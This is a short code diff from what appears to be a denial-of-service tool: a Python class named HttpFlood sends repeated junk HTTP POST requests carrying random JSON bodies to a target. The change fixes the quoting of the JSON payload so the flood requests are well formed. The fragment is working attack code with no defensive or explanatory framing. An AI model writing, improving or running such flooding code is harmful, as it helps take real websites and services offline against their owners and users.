@@ -715,7 +715,7 @@ class HttpFlood(Thread):
             ("Content-Length: 524\r\n"
              "X-Requested-With: XMLHttpRequest\r\n"
              "Content-Type: application/json\r\n\r\n"
-             '{"data": %s}') % ProxyTools.Random.rand_str(512))[:-2]
+             '{"data": "%s"}') % ProxyTools.Random.rand_str(512))[:-2]
         s = None
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
